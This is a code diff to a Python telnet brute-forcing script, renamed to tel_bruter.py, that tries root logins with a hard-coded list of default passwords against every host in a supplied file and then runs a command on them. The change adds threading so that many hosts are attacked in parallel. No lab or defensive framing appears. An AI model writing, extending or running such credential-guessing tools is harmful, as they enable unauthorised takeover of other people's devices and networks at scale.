@@ -1,4 +1,5 @@
 import telnetlib
+import threading
 import sys
 
 # Command to be executed on clients
@@ -9,7 +10,7 @@ passwords = [b"root", b"toor", b"admin", b"password"]
 username = b"root\n"  # Multiple usernames are not supported
 
 if len(sys.argv) != 2:
-    print("Usage: tel_login.py filename")
+    print("Usage: tel_bruter.py filename")
     sys.exit()
 
 filename = sys.argv[1]
@@ -38,5 +39,11 @@ def process_client(client):
 with open(filename, 'r') as f:
     clients = f.read().splitlines()
 
+threads = []
 for client in clients:
-    process_client(client)
+    t = threading.Thread(target=process_client, args=(client,))
+    t.start()
+    threads.append(t)
+
+for t in threads:
+    t.join()
